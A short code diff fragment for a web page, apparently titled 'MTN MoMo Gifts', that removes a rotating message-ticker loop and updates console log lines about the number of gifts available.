-            const ticker = document.getElementById('tickerText');
-            if (ticker) {
-                tickerIndex = (tickerIndex + 1) % liveMessages.length;
-                ticker.textContent = liveMessages[tickerIndex] + ' • ' + 
-                    liveMessages[(tickerIndex + 1) % liveMessages.length] + ' • ' +
-                    liveMessages[(tickerIndex + 2) % liveMessages.length];
-            }
-        }, 5000);
 
         console.log('====================================');
         console.log('🎁 MTN MoMo Gifts - Homepage Loaded');
-        console.log('📊 18 Gifts Available');
-        console.log('🔴 Live Ticker Active');
+        console.log('📊 24 Gifts Available');
+        console.log('🔴 Live Ticker Active (+26096...)');
         console.log('====================================');
     </script>
 
